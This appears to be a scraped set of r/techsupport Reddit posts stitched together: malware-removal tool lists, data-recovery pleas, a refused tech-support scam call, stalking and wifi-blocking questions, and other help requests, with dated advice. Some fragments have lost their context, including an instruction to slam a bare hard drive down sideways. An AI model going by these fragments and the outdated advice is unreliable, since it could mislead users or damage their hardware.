Here's a [link](http://windows.about.com/od/windowsosversions/ss/Determine_Vista_Version_Service_Pack.htm) to determine which version service pack you may have.

* XP: Service Pack 3
* Vista: Service Pack 2
* 7: Service Pack 1 (this is optional, so you have to check Windows Update yourself to install)

If you are still infected you may have a Master Boot Record (MBR) Virus (however ComboFix should have removed it) More information on how to remove an MBR virus can be found on my forum post [here](http://www.technibble.com/forums/showthread.php?p=173778#post173778).


**Advanced Tools**

* [Autoruns](http://live.sysinternals.com/autoruns.exe)
* [Process Explorer](http://live.sysinternals.com/procexp.exe)
* [GMER](http://www.gmer.net/)
* [TDSSKILLER](http://support.kaspersky.com/downloads/utils/tdsskiller.exe)
* [Hijack This!](http://download.cnet.com/Trend-Micro-HijackThis/3000-8022_4-10227353.html)
* [OTL](http://www.geekstogo.com/2010/05/27/otl-by-oldtimer-a-modern-replacement-for-hijackthis/)


**For the paranoid**

I'm going to guess by now at least someone has a bone to pick since I didn't mention getting a third party firewall. I don't feel the need to have a 3rd party firewall because the one built into Vista/7 already covers both outbound and inbound but there are tons out there people have felt have kept them safe. My take is to each his own, just make sure the infection hasn't broken its rules or its overall functionality.

There is also something that blacklists known bad IP servers called PeerBlock, which a lot of people use to prevent third-party copyright agencies from catching people who torrent. As an added benefit from the P2P blocklists there are also malware blocklists, so check that out. Note that at times an IP you need may be blocked (eg if you checked Educational Institutions as a blocklist to include during setup and you can't access the internets while on campus). There are forums on the peerblock website you should check out for detailed questions there.

This guy is supposed to be pretty good with computers. We think this guy may have hacked her computer, and is stalking my sister. It all started with my sister looking into buying a truck so she googled ""F150 Raptor."" He later texted her saying, ""The Raptor is my favorite truck."" She took it as coincidence. On another occasion, she googled ""Buffalo Wild Wings."" He texted her almost instantly, ""You want wings or what?"" Then, my sister looked up make up tutorials on Youtube. He then texted her, ""I bet you're one of those girls who looks up make up tutorials online."" On yet another occasion, my sister googled, ""if you practice singing do you get better?"" He instantly tweeted, ""Yes princess, practice makes perfect."" My sister was once talking with a friend of hers on the land line after an early morning jog. He send my sister a good morning text saying he was up for a jog. My sister tells her friend she thinks this guy knew she woke up early to go for a run, and he instantly sends her a text saying, ""I had no idea you were jogging."" My sister is creeped out, and frankly so am I. Is it possible that this guy has not only hacked her computer, without ever having access to it, but also tapped into our phone line? Is there any way to find out, and if he has, is there any way to stop it. Going to the cops would be the obvious answer, but we'd like to leave that as our last option.


tl;dr Is it possible this guy knows what my sister looks up online, and what she's saying on our land line?


edit: I forgot to mention that as a present he gave her two usb drives full of movies which she of course plugged into her computer. That might be a way he could have gotten access to her computer.

Hold the bare drive in your right hand, standing up on a firm surface, pins/connectors down, top/label facing you. Pivot it on the left corner, and SLAM it down sideways on the left side.

The tests include:

* Protection against 0-day malware attacks, inclusive of web and e-mail threats (Real-World Testing) from a sample of 125.
* Detection of widespread and prevalent malware discovered in the last 4 weeks (the AV-TEST reference set) from a sample of 18,267.

* Impact of the security software on the usability of the whole computer from false warnings or blockages when visiting websites
* Impact of the security software on the usability of the whole computer from false detections of legitimate software as malware during a system scan
* Impact of the security software on the usability of the whole computer from false warnings concerning certain actions carried out whilst installing and using legitimate software

**Troubleshooting**

 * Can't access windows? - Try using [Avira AntiVir Rescue System](http://www.avira.com/en/support-download-avira-antivir-rescue-system) to install AV programs or fix possible issues restricting you from booting into windows.

 * Check proxy settings if your browser cannot access the internet. [Firefox](http://www.ehow.com/how_5828352_reset-mozilla-firefox-proxy.html) proxy reset.

 * Getting programs on PC without internet connection - Easiest solution is to place programs on a usb flash drive.

 *  AV Programs wont run? - Try changing the name of the program or try running in [Safe mode](http://www.microsoft.com/resources/documentation/windows/xp/all/proddocs/en-us/boot_failsafe.mspx?mfr=true)

 *  Google redirect virus. - [Use Kaspersky Rootkit removal tool](http://support.kaspersky.com/viruses/solutions?qid=208280684)(TSDD Killer) or [Hitman pro](http://www.surfright.nl/en/products/)
 

**Anti-Virus** - Make sure any programs used are fully updated.

* Scanning - Some programs work better when scanning in safe more however this is not always the case, Try running AV scans in normal windows or scan in safe mode if the infection is preventing that, Once safe mode scanning and removal of infections are complete run again in normal windows boot mode.  ""How do I safe mode?"" - [Safe mode instructions](http://www.microsoft.com/resources/documentation/windows/xp/all/proddocs/en-us/boot_failsafe.mspx?mfr=true)

* Whats [hijackthis?](http://free.antivirus.com/hijackthis/) - [Link for creating a hijackthis log](http://www.bleepingcomputer.com/tutorials/tutorial94.html)

**PC Clean-up** 

It's always good to keep your pc clean of unused software and cleaning up crap in registry leftover files from old programs, These programs will complete these tasks.

* [CCleaner](http://www.piriform.com/ccleaner)
* [Revo Uninstaller](http://download.cnet.com/Revo-Uninstaller/3000-2096_4-10687648.html?tag=mncol;1)

**COMBOFIX**

Guide for using [Combofix](http://www.bleepingcomputer.com/combofix/how-to-use-combofix) - However, You should not run ComboFix unless you are specifically asked to by a helper. Also, due to the power of this tool it is strongly advised that you do not attempt to act upon any of the information displayed by ComboFix without supervision from someone who has been properly trained. If you do so, it may lead to problems with the normal functionality of your computer. 
 

**Prevention** 

The best way to prevent future infections is to keep a AV program running like    

* [Avira AntiVir Personal](http://www.avira.com/en/free-download-avira-antivir-personal)
* [Microsoft Security Essentials](http://www.microsoft.com/security_essentials/)(Very popular **FREE**)
* [Kaspersky](http://usa.kaspersky.com/) **Not Free**
    
If your using Firefox these addons will help against future infections.
  
* [WOT Safe browsing addon](https://addons.mozilla.org/en-US/firefox/addon/3456/)  
* [Adblock Plus](http://adblockplus.org/en/installation) is also a very popular choice for eliminating ad's if your visiting questionable sites or just protecting grandma from literally surfing the web ad to ad and don't have a problem with not giving sites revenue for ads but that's more a personal choice. 
* [NoScript addon](http://noscript.net/) for FireFox makes it difficult for a website to execute JavaScript, Java and Flash and other plugins without your permission. 

**Backup your data!**

I've Been a fan of [Acronis](http://www.acronis.com/) backup software but I know there are others available so I will try to search them out.

**All Is Lost, What now?**

Many people suggest a re-install of windows if it has ever been infected as there is really no way to get the system exactly back to pre-infection. If you do decide to reformat the drive and or re-install windows or OS of your choice and make sure to download all updated for your OS as well as Java, Adobe, Browser and AV.

* [Ninite](http://ninite.com/) Allows you to download pre-batched software for easy installation including, Browser, Anti-virus, Java, Itunes, CCleaner, Revo Uninstaller ect.

 What information should I include when I post? - Please post computer OS, Installed Anti-Virus software. Virus name if possible. Steps already taken to eradicate virus. Hijackthis log.

Each memory stick you own, open it up and create a folder in the root of your memory stick called autorun.inf

A file will not do, make a folder. This will block the majority of memory stick virii because they spread via writing their own autorun.inf file on your memory stick, which runs automatically on being put in a PC, infecting it. These virii will overwrite any existing autorun.inf - but what the vast majority (I've seen none) of memory stick virii don't account for is that **you can't overwrite a folder with a file** so they cannot spread.

That's all folks, bung that autorun.inf folder on your USB memory sticks (and any other removable media, your external HDD, your iPod, your phone) and tell other people about it.

* I live in a house with 10 other students. I am the oldest, landlord is female so I am usually in-charge of most of the technical aspects in the house.

* Wifi connection is shared. The internet router is D-Link DCM-604. 
WPA/WPA2 Encryption (TKIP + AES). Everyone in the house knows the wifi password. Only I know the router admin password.

* One kid decided to block all others internet connection, leaving only him and his roommate so they can play MMO lag-free. I don't know which hack tool he uses or how did he does that. I only overheard him talking to his friend that he is locking others so he can play

* I checked the router settings, nothing changed, nothing in the port filtering/IP address filtering/MAC address filtering sections. Only I knows the password so I don't think he accessed the router settings.

* Every PC can connect to the wifi and locally, just not the internet. Sometimes I can ping external website (google.com), sometimes I can not.


So my questions are:

* How did he do that? OR What hack tool did he used?

* How to prevent and counter?


I do not want to expose him to the landlord yet. He is just a kid, I want to get more proof and confront him first.

I'm really disturbed at the amount of references and suggestions made towards registry cleaners.  Computer owners are always told to free up hard drive space, delete all unnecessary files and programs; users are lauded for having sloppy desktops.  Keep it clean!  Keep it neat!  Delete ALL THE THINGS!  However, this practice is not ALWAYS the best approach.  

- The real scoop is that the benefit of running a registry cleaner is often GREATLY over-stated.
- Registry cleaners can frequently cause more problems than they solve.
- Computer issues are almost NEVER caused by stray registry entries that are orphaned, inactive, or unnecessary.  

Back in the day where drive space and system memory were at a premium, cleaning the registry would undoubtedly show a limited benefit.  However, with today's systems, the speed or memory gained by scrubbing the registry doesn't show much benefit at all.  I'm not saying there is NO benefit - programs like CCLeaner have a long track record of positive outcomes. I'm just saying that if your computer is running slow - the registry is just about the *LAST* place you want to look.  You need to first rule out things like Spyware/Malware, memory issues, drive space, hardware failure, and more before jacking with the registry.  The risks FAR outweigh the benefits!  Thanks!

(edit - I'm not saying they are totally pointless.  What *I AM* saying is that there are a hundred other things that people need to look at before they start running reg cleaners on their system in an effort to fix problems.  Running a reg cleaner comes up WAY to quickly and way to frequently when the proper advice should center elsewhere.  Matt08642 said it best so far:  ""They are like the go-to solution for people who have NO idea what they're doing."")

EngelbertHerpaderp	121	30	96	"Update 9 - It looks like it was all for nothing. The entire drive is corrupt to hell and back. The GetDataBack scan started on the morning of the 15th and ended around 12:15am on the 20th (nearly six full days to scan / recover everything). I essentially recovered 319gb of garbage. Oh, all the files are there, but they're all corrupt. None of the images load using any image viewer, and no video player will play a single video. It's all here, yet it's all gone. A harsh lesson learned the hard way, to be sure. 

If someone would be kind enough to tell me the best way to simply turn it back to a proper 500gb drive as opposed to the 2gb it's showing up as now, I'd appreciate it. 

*******************************************************************************

UPDATE 8 - This is for those of you, few as there may be, who are still monitoring this post for updates. 

GetDataBack has been doing it's thing now since Valentines day.    ....literally. An initial scan of the entire drive took about 16 hours, and had to be restarted from scratch because automatic updates was still active and I was only given an option to ""postpone"" a restart every four hours, rather than altogether. I tried staying up until the scan ended, but fell asleep shortly before it finished. When I awoke I found that the scan aborted due to the forced restart, so I had to start it all over again. 

After scan number two finished, I started scanning and copying over files the large partition it found. This has been going on since Sunday evening, non-stop, and it's still only 61% done because I'm transferring everything via usb 1.0 from one external to another. FUN. But, it's working...albeit RIDICULOUSLY SLOWLY. 

Once the transfer is complete and I've had a chance to see both of how much was saved and lost (due to corruption), I'll share a final update. In the meantime, this...is going to take at least nearly two more days at this rate.....


********************************************************************************

Update 7 - I stepped away from my computer and this whole mess for a few days and a volunteer will be helping me remotely before too long, when our schedules mesh. I just wanted to say THANK YOU to the awesome redditors among you who offered tips, advice, and encouragement. To the very few trolls and jerks, I don't know what your problem is, but when you were little your parents clearly didn't seem to instill the notion that if you don't have anything nice to say, don't say anything at all. If you have nothing to contribute but insults and slander, don't bother posting. For your sake I hope you find yourself in a similar situation one day and you freak the fuck out too. You're not above it. A nearly full 500gb external is a whole hell of a lot of data, and a lot to lose. Especially when its contents aren't simply pictures of cats and pr0n. 

But again, thank you very much to everyone who offered legitimate advice. No additional data has been written to the external, and all my fingers and toes are crossed. We'll see what happens. 



Update 6 - A redditor from Ireland has offered to assist me remotely using ""TeamViewer"" in a few days time. In the meantime I need a break from all of this. I don't want to even be in the same room as a computer for a few days. Thanks to everyone for all the suggestions and advice. I'll post another update in a few days after the remote assistance. 

*******************************************************

Update 5 - I'm stilling running the analyze option with Disktest because I don't want to stop it prematurely if it will just make things worse, and I have yet to get any feedback from my fourth update. 

I found a step by step guide for the other option, but even this is extremely confusing 

http://www.cgsecurity.org/wiki/PhotoRec_Step_By_Step


Why isn't there a simple one or two click process?  Are there no programs where you start the app, plug in the drive, scan the f%#ing thing and save what it finds to another drive using a standard windows interface?  

I mean just look at all the options under ""Source partition selection"" in the step by step guide. It shows 15 options, and shows ""size in sectors"" rather than mb's or gb's. How am I going to know which one to choose? How do I select all of them???  I want to retrieve as much as possible.

And then there are the PhotoRec options. I have no idea which to go with. Do I go with the paranoid mode? expert mode? keep corrected files?  What do I do to simply get all this stuff back???   :*(


*******************************************************

Update 4 - Oh for fucks sake, according to this I shouldn't be using testdisk for my problem at all, which makes sense since I wanted to restore files, not partitions. I should be using PhotoRec

http://dottech.org/10756/testdisk-photorec-the-most-powerful-doomsday-datapartition-recovery-duo-you-will-ever-use/


WHAT I NEED TO KNOW RIGHT NOW - I NEED TO KNOW IF I CAN STOP THE ""ANALYZE"" PROCESS IN TESTDISK without hurting anything so I can start PhotoRec instead. HELP!!!!!!!

********************************************************

UPDATE 3 - Further research on testdisk suggests that this isn't even the proper program I should be messing with. It's for deleted partitions  and non-bootable partitions. I deleted a drive full of FILES  *sighs*   After the analysis I'm likely just going to contact one of the nice individuals who told me I could send them the drive directly, seeing as I have no idea what I'm doing. I don't know what to do at this point. I just want everything back, and I want it back right now. 


*******************************************************

UPDATE 2 - Since the only comment since my first update was ""You formatted twice? You're fucked""  (thank you so much for that, how nice of you. Thank you for sending me into panic mode). 

So now I grew impatient and started TestDisk. I found this guide

http://www.cgsecurity.org/wiki/TestDisk_Step_By_Step


and began the process. And now I'm completely at a loss what to do, even with a step by step tutorial in front of me. 

1. Create Log - check

2. Disk selection - check  (it showed up as 465gb, which was good)

3. Partition table type selection - Intel / PC - check

4. Current partition table status - analyze - check


This is taking a long time, and I can't understand anything that follows. The guide states that ""quick search"" will be the next option, followed by saving or searching for  further partitions using ""deeper search"". After that, it's all greek to me and I don't follow anything. I don't see anything that tells me  ""here's your data, all is well"". Just a bunch of jargon I can't follow. 

I'll update again once the Analyze cycle is complete, and I'll share a screen capture. If any of you would be willing to walk me through the process from that point on while I take things step by step while uploading links to screen caps, I'm willing to give it a try. Otherwise I have no idea what else to scan, which options to choose, what to ""write""  (or when). As I said, I'm freaking the fuck out and I don't know what I'm doing. I thought running testdisk would be easy and self explanitory, but it all looks like dos to me. 

********************************************************

UPDATE 1 - Hello everyone. I've been up a short while and was grateful to see so many suggestions and even a few offers to help me directly in my message box. I may take one of you up on that. 

Based on all your suggestions, these are the programs I should try - 


Recuva

TestDisk

PhotoRec

Active Undelete

GetDataBack

EASUS Data Recovery Wizard

Recover My Files


I installed Recuva, nervously plugged in my external, and all that shows up is a 2gb drive. I did a ""deep scan"" but it was done in about 30 seconds. I'm so scared to have this thing plugged in I just pulled it out, which I normally never do. I always remove it properly by ""removing hardware"" by ejecting it properly. 

What I need to know is this - Can I plug in the external and leave it plugged in for an extended period of time, and try all of the above programs without hurting anything further?  I will NOT save anything else to the drive, but rather scan it with most of the programs above. I'm guessing some are better than others, but all Recuva did was a quick scan of a two gig drive, because that's what it saw. I don't know anything about finding partitions or dealing with them. To ""PotatoesAndOnions"", you said ""you probably just made a 2GB partition on a 500GB drive because the usb stick is 2GB. unpartitioned space won't show up"".  When I plug in the drive, all I see it one 2gb drive. Not the main drive with a smaller partition. 

Will scanning the drive with multiple programs hurt the contents of the external further if all I'm doing is scanning in hopes of file recovery?  Is this something I can try with multiple programs to see which works best, or should I opt for the best of the above choices?

I'm treading carefully rather than recklessly, so I won't touch the external until a few of you chime in on my update. I'm glad that some of you have provided hope that not all is lost. 

Which is the best choice for a program that will actually see my drive for what it originally was, and not what I turned it into as a result of my format?  Recuva got a fair amount of votes but it didn't help at all. It seems that testdisk and GetDataBack may be the next best options. 

Hope to hear from you guys again....

********************************************************


I just accidentally formatted a 500 GB external full of wedding photos, priceless family videos, my fathers memorial service, etc. NONE of this was backed up elsewhere. One of the projects I was about to DO right now was begin to back things up, and now this happens right beforehand. 

To top it off, now the 500gb drive is showing up as 2gb!!!!!!  It was originally either ntfs or fat32, and now it's just FAT. I may have even formatted the drive twice in a row, I'm such a dumb fuck. I was TRYING to make a usb boot cd for xp, and I forgot to unplug the external and formatted the wrong one.

I've never felt more sick than I do right now. I did some research and downloaded Active Undelete, but I feel all I'm going to do if I proceed is make things worse. I'm in no position to pay for an expensive recovery service. I need help. I'm not going to touch the drive again in the meantime. I'm on the verge of tears. "	t5_2qioo	True

Kinda solved.  User sephiroth2k wrote a program that I can throw in my start up folder that toggles caps lock when it is run.  While it's not the best solution (as in, it doesn't fix the source), it works!  Thanks a ton, man!


http://www.reddit.com/r/techsupport/comments/x1sks/hp_pavilion_g7_caps_lock_key_stuck_on/c5itdfz

---

edit2: Here's what I've been able to find out/clarify thanks to most everyone that replied

Caps lock gets turned on during POST, first thing when the computer turns on, and the caps lock key itself is unresponsive when you press it.  My guess is it's an issue with the contact on the key or how the keyboard is connected to the laptop.


Anything that would remap or unbind the caps lock key doesn't work, because it gets turned on when the computer turns on and windows is unable to detect any keypresses from the button.  


The only thing that does work is doing something that actually toggles caps lock from windows, like the on screen keyboard.  The problem with this is the on screen keyboard program has locked up like 45 out of 50 times I've tried opening it.


Of course, I could just hold down the shift key as I type, but in the long run that just isn't feasible.  My pinky is almost cramping up a it is, so I can't imagine trying to type a paper like this.



The one thing I have NOT tried is using something like a usb keyboard.  I do not have one available at the time, but will give it a shot when I can.


---

edit: [](/solution) 
User talkingsmall suggested using the on screen keyboard to turn off caps lock.  While this works, my on screen keyboard doesn't even load 90% of the time (it locks up), and caps lock still turns back on during POST.

1341247250.0	vxhy3	My father's web designer is blackmailing him because he asked for the FTP user name and password. How do we get rid of this guy!?	less_one	94	9	85	"Update.
Got new host and reuploaded files a wonderful redditor retrieved for me
Changed registrar password
Changed Adwords and analytics password
Cancel old host tomorrow 

Anything else I should do to cover our ass?











This is the story.

Father hires web designer in 2008, no contract really, guy just says he'll build a website for him for X amount of dollars. 

Web designer charges lots of money for pretty simple website.

Web designer hosts the website on his server. $130 per year.

Always tries to get more money, saying he is doing marketing. Meanwhile when I open up the google adwords campaign it is a total botch job. We are spending money all over the place for fake advertising. Just got that fixed up... 

I want to make minor tweaks/ fix links on website and don't want my father charged for something I can easily do.

When I call the web designer and ask for FTP client username and password he flips and blackmails us, saying he is going to contact our competition and do work for them.  Not too worried about that... 

He says he will mail us a cd with the website files on it but he must first protect his intellectual property. If anyone wants to view source and take a look at site please message me! I would love for your input.

I just don't want this web designer getting the best of my father and screw him out of a website he payed lots for. It's a mom and pop style business that pays the bills, not some mega corp.

Reddit, can somebody outline the steps necessary to get rid of this guy without jeopardizing the website we purchased years ago? 

I know I need a new host and want the website to appear exactly the same once reuploaded, can I do this without the current FTP info?

So after clicking download update I got taken to their website were I needed to download the Update installer. So far nothing new. 
Downloaded the update installer, clicked next.
Got the same 3 options as always. Allow adobe to install when there is a new update, ask to install first, or ignore updates. I always go with option 2: Ask me first. 
So I check that and click next. 
On the next screen the update starts to download but to my surprise a copy of Mcafee security scan plus is also downloading! 

At first I thought I must have missed a check box somewhere so I cancel the application and start over. 
Nope, no check box or anything mention Mcaffee stuff before it automatically downloads on my pc. 

Are we now forced to install Mcafee every time there is an update for Flash? is there any way to get the update without having to install bloatware?
Is adobe really this slimy or did someone forget to add the check box for it? I don't them trying to push crap on me as long as I can opt out of it. But now its just being forced on me. 
I keep hoping I am just being stupid and missed a check box somewhere so I keep restarting the application but no, no check box to unchecked anywhere.

**EDIT:** there seems to be some confusion about this subject because some people can and others can not opt-out of it. Not sure what is going on here. I was able to opt out of it after going to the website and downloading the flash client that way, although others seem to not be that lucky. 

For the people who recommended Ninite, Thank you :) this is a pretty awesome site :). I actually remember using it a long time ago when I had to re install windows. Its nice to see they now added even more programs to select. 

I am sorted for now so I am just gonna go ahead and set this one as solved but I don't think its a bad idea to keep the discussion going for a bit to see if more people report problems.

Two weeks in, the trackpad started cutting in and out, so we took it in since she bought the 3 year Accidental Damage and Handling Protection. They told us it was a software issue and to wait for a windows update. fast forward to July 9th, when we discover that the headphone jack is faulty and will not work at all with any headphones that have a microphone on them. The computer gets sent out, and we receive it like a week and a half later. They had replaced the touchpad and said they couldn't replicate the headphone problems. Since they didn't notify us that they were delivering it, it sat in a UPS Warehouse over the weekend, so we called corporate to make sure that everything had been fixed with it. The customer service rep then called the local store to talk to the tech who had submitted the order. They had no clue what she was talking about. Come to find out, the guy we were speaking with had submitted the order under another employee's ID number. When we asked the manager about it, he told us that it was common practice in order to keep productivity up, and that every employee did not have their own number. Corporate of course, refuted his claim, and even called to talk to techs in the store and everyone agreed he lied to our face. So we took the laptop back to the store, had it sent off yet again and just recieved it a few days ago. They claim they replaced the entire headphone jack board, but the problem is still there, like nothing ever happened. As we have explained to everyone involved, we are leaving on August 20th to volunteer as part of Americorps NCCC, where we will not have a physical address. In the last two days we have spent more than 5 hours in store, and on the phone with best buy, and 3 hours talking to ASUS to get our problem resolved. Best Buy expects us to use up our entire 3 year $350 protection plan in order to replace a defective product that they sold us, and to then purchase a new warranty that will cost another $350, if not more. All we need is a working computer and 3 years of ADH protection, like we payed for. 

EDIT:We've escalated it as far as it will go with Best Buy, and are now working on sending it out to Execs.
REDIT: After emailing several Best Buy Execs, we got a phone call from someone in the Executive office who said that he's launching a full investigation into our issue and that he agrees what we've been put through is ridiculous."	t5_2qioo	True

1328190972.0	p7o3e	Excuse my ignorance r/techsupport, but was I correct to hang up on this man or do I need to take my computer to the shop?	Avliise	90	15	47	"I live in England and on the news recently I heard about a few scams about people calling you getting your information etc. Anyway I just recieved a call from a company seemingly with no name, the man said to me that they provided tech support for every broadband provider in the country and that there was a problem with my computer which was making my computer and internet slow in the form of viruses. My first reaction was, you're not giving me a name for your company so I'm going to question every little thing you say.
   
So firstly the man told me there was a problem with one of my computers, they knew this because microsoft sent error reports to them so they could call the consumer. He also told me that I had always chosen not to send the error reports (so err?). I then asked which computer he might be referring to, as we have a few. He said my laptop. I asked which one, he said the oldest computer in the house and I said this was infact a desktop. He had me go to the computer and asked me to press the windows key and 'r' at the same time, so he could connect. I refused, unsure and unable to tell if he was genuine or not and called him on this. He said he could tell me the web address for their site and I pointed out -ever so nicely- that I could phone him up, tell him to go to facebook and claim I own it. He did not like this. 
   
Eventually I told him that I was willing to search through my computer with the mouse and look myself using programmes I was familiar with if he was so desperate. He then told me to right click on my computer, click on 'manage'. I did so. Then 'event view', 'application', 'filter current log' and to select 'error and warning' and press ok. I did so and it came up with alot of errors and warnings. He then asked if I would connect the computer now. To which I asked him to provide me with details of my name, address etc to prove this -once again- was a genuine call from a certified company. He failed to do so and I bid him good day. 
  
 Whether I was correct in doing this or not I don't know, all I do know is that if there is a genuine problem with my computer I would prefer to pay to have it fixed at a reliable location than over the phone with a company I do not trust. What do you think? [](/solved)"	t5_2qioo	True

1307260673.0	hs0kz	PLEASE READ THIS BEFORE POSTING QUESTIONS!!!	xacked	93	18	20	"Hey everyone! Please try to make it easier us volunteers to help you by sticking with the following:


**Be specific about the problem.**: The more information you give us, the faster we can help you. Less information = less information to help you with. 

- example: You can use: ""My internet doesn't work!!"" or ""My internet is really slow"" in your title, but in your description, try 


- ""I'm running [INSERT TYPE OF CONNECTION: cable/dsl/dial-up] from [INSERT INTERNET COMPANY] and my setup is connected from the modem to  a [INSERT ROUTER MODEL NUMBER or whatever else is in between] and my computer is a [INSERT MAC or PC] running [INSERT OPERATING SYSTEM] and is connected [INSERT WIRED OR WIRELESS]""  


- for example, ""I'm running cable internet from Time warner and my setup is connected form the modem to a linksys e2000 and my computer is a pc running Windows 7 and is connected wirelessly but I keep having problems. When I run speedtest it shows my speed is 1.5Mbps but when I connect directly it shows 25Mbps""



- If you get an error message and you can cause it to come up again, write it down and post it here. For blue screen errors, you just need the strings of numbers/letters after STOP: and the next line.


**Be specific about your computer/etc specifications.** There are stickers on computers with the names of manufacturers, model numbers, etc. for anything that you aren't sure of how to describe...


- example: ""My computer is an Intel Core 2 Quad Q8600, 4GB DDR2 RAM, 1.5 TB SATA hard drive"" or even ""My computer is an HP DV6000 Laptop""




**Take pictures**: Try to make them as not overly grainy and as clear as possible with good lighting (but not a blinding flash).


**Use the search feature in the sidebar**: There's a fair chance some redditors may have already asked the same or a similar question.

 
**---------------------COMMON ISSUES AND COMMON SOLUTIONS------------------------**

 

**If you have a virus** --&gt; Please follow [this](http://www.reddit.com/r/techsupport/comments/eskfn/malware_removal_guide/) guide.

 

**If you have an OS-related boot issue** (no boot, ntldr missing, etc) --&gt; There's a fair chance (in my experience with hundreds of laptops, its around 10-20%) your hard drive is failing. In my opinion it's always best to check this first, because if its failing with bad sectors assume your data will be lost and backup immediately if you haven't already (or you haven't recently, or skip this if you don't care about your data). Even if the problem doesn't seem hard drive related its best to check just in case, better safe than sorry. [Seatools](http://www.seagate.com/ww/v/index.jsp?locale=en-US&amp;name=seatools-win&amp;vgnextoid=552bd20cacdec010VgnVCM100000dd04090aRCRD) is a really easy to use hard drive diagnostic tool that works on nearly all hard drives out there. 


**If you have a hardware boot issue** --&gt; If you are on a desktop, try disconnecting all non-essential components (start with the USB peripheral stuff, then move on to add-in cards, RAM). Then boot with the bare bones, take each RAM stick out, put one in, try booting, try the other stick, etc.


**If you lost your data** --&gt; You can try to recover it yourself, or if the hard drive is dead dead (like no spinny dead) you can ask for recommendations for advanced hard drive recovery services people have used.


**If you have internet connectivity issues** --&gt; Please directly connect your computer to your modem using an ethernet cable. Even tech savvy people like me still do it, there's no shame in doing that, or powercycling (unplugging and replugging) everything and restarting your computer. Cover the basics and it'll fix half of your problems or at least narrow things down. Usually it's either your ISP (including the modem they provide), your wireless router (sometimes the router firmware may need an update since the manufacturer realized multiple units had fkups and they released a fix), or your computer's wired/wireless NIC drivers may be outdated.


**If its a specialized issue for something like OS X or iOS**--&gt; visit another subreddit like r/OSX or r/iPhone or r/iPad, the users there can probably help you too.


**If you have any other issue not mentioned or clarified here** --&gt; Post! For the most part people here in my experience are friendly and helpful. Also note: skip the local Geek Squad, most likely if you are here already you want to learn or you need some expert advice and you want to save yourself from getting ripped off. If you are at an impasse and need professional assistance, Yelp your local computer repair stores, I promise you the stores that have good ratings have people working there who know their shit and will do their job much better than GS or any other corporate computer repair service. 


**---------------------TO VOLUNTEERS------------------------**


**[We aren't Linux evangelists](http://www.reddit.com/r/techsupport/comments/dix99/listen_up_wanna_be_techs_suggesting_that_someone/)** People get downvoted for snide comments about how ""this wouldn't happen if you ran Ubuntu, go reformat and install Ubuntu."" By all means suggest Ubuntu as a diagnostic or data recovery tool, but don't force your OS beliefs on others please, even if its true ;)

 

**To those of us who have intimate technical understandings of the issue** - There's a need to at times simplify the explanation. I don't consider it dumbing down, but rather making our explanations something anyone can relate to and understand. If it does get technically complex, at least make sure you are clear and methodical in the explanation.

I am a Microsoft Certified Technology Specialist (Volume Licensing - Large Organizations and SMBs). I have worked for a Microsoft Licensing Support call center, as well as a major reseller as a Microsoft Licensing Specialist.

No question is too big, too small, or complex. I'd also like to invite any other licensing peeps to come out for the discussion and help people out!

Cheers!

CompulsivelyCalm	81	9	102	"My friend's mother is very big into genealogical studies yet not that proficient with computers. The main family tree file (a .doc of course) has been corrupted and apparently the last time she backed it up was 4 years ago. When trying to open it a window pops open that says ""Word was unable to read the document. It may be corrupt."" and gives a list of things to do.

I've run a chkdsk to ensure it's just the file and not the drive, I've tried the Open and Repair function in Word 2010 and tried the Recover text from any file option as well. I've tried opening it in OpenOffice and notepad to no avail, and tried using the OfficeRecovery program (which of course was unable to resolve it).

Aside from all that I'm out of ideas and this document is *extremely* important to her and her entire family. Can anyone help out?

**Edit 01:** Okay, I've done all I can for tonight and will be getting the laptop tomorrow. It stands at I'll be checking the temp files folder and using a hex editor to sub out the header for the document type. If anyone can think of anything else, feel free to post it, but you won't hear from me until tomorrow!

**Edit 10:** Having looked in the temp folders, there are no ~wrd*.tmp or ~wrf*.tmp. I may be looking for the wrong files, but I searched for those exactly. I assume the filenames are ~wrd for classifying what it is and then the wildcard gives the name of it, if I should search for something else let me know. With the hex editor I looked up what a header should be (0D 44 4F 43 for a .doc) and was not able to find that string in the file. Given that I've not used hex editors before, what should I do from there?

we have had a whole bunch of users report that their mouse and keyboard have stopped working. some 100 odd so far and they keep coming.

We run a windows server 2003 network and all the client machines are WinXP. replacing the keyboards and/or rebooting doesnt help the issue. this all started at 5pm yesterday but we have not pushed out any updates.

is anyone else experiencing this or has anyone experienced this in the past?

thanks in advance!

EDIT: MORE INFO

devices are detected by bios. safe mode yields no luck and devices are not picking up IP addresses from cat5 cabled connection. No policy changes have been made and this has been confirmed. We cannot even remote in to the machines to have a look. Virus scans show all clear

EDIT 2: MOAR INFO

so far disabling and re-enabling keyboard in BIOS restores the keyboard for a fraction of a second, IE we can press ctrl+alt+del to get the logon prompt but if craps out right there afterwards.

EDIT 3: info++. Thanks for all the help so far guys!!!!

ok, it is happening across multiple hardware set ups, including toshiba, viglen, hp and dell. safe mode has the same issues and windows repair has no luck. we have also reimported the drivers and registry keys using known working machines. we also have users who have not connected to our network for over a week (not even vpn) calling us up to say they tried to connect from home but their keyboard wont work.

all hardware ports on machines are behaving normally unless a keyboard is hooked up (com port, ps2, usb).

6\. Click ""OK"" all the way back. You may need to restart your browser to take effect. ([Test link](http://imgur.com/a/WhTtN#0).)

**NOTE:** [eviloverlord](http://www.reddit.com/r/techsupport/comments/yp14y/visit_imgurcom_see_project_review_period_is_now/c5y23ur) stated (s)he had to run ""ipconfig /flushdns"" from a command prompt to get this solution to work. Consider this a possible Step 7 if the previous six don't help!



##Windows XP (thanks [zolesz_95](http://www.reddit.com/r/techsupport/comments/yp14y/visit_imgurcom_see_project_review_period_is_now/c5z7kf2)!)

Router|[Verizon provided router](http://www.actiontec.com/products/product.php?pid=189)
Problem| **Internet speeds sporadically drop to almost nothing when many computers are connected to the router**
Frequency of problem| Occurs a few times over several hours when many computers are connected 
Previously failed solutions| (1) Verizon replaced the router
 |(2) We purchased a Linksys router (assuming it was a problem with the verizon routers they kept sending us)
Current workaround | Reboot router. Internet speeds resume fine after a reboot
Current theory | It is not a router problem since replacing the router didn't change anything. It must be a computer problem, but I'm not sure what computer or how many have this problem. 
Additional information|This problem only occurred after my brother and I came home from college and connected our PCs to the network. They're identical desktop builds running windows 7 x64. This occurs during basic internet use (no file downloading, just web browsing). 

**Although connection to websites is slowed or even impossible during these moments, I can go directly to the router home page with no problems**



Solving this would save a lot of family problems and arguments


*edit2*

